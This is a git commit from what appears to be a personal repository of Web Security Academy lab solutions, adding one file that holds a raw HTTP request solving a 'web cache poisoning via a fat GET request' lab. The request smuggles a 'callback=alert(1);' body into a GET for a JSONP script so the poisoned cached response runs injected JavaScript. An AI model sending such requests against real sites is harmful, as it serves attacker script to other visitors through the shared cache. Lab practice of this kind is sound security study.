d9617b8d8c6e7acaf17e3a472054d205f1cc34a0
Paula Fernandes <paula@MacBook-Air-de-Paula.local>
2022-04-20 20:50:14 -0300

    upgrading labs

---
+++ Web cache poisoning via a fat GET request.js
@@ -0,0 +1,19 @@
+GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
+Host: ac431feb1e043d51c0b43ac300af003b.web-security-academy.net
+Cookie: country=[object Object]; session=0I4XzxDNaALUD6Yi0WOt0ifTLwvtMRmo
+Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
+Sec-Ch-Ua-Platform: "macOS"
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: script
+Referer: https://ac431feb1e043d51c0b43ac300af003b.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-Length: 20
+
+
+callback=alert(1);
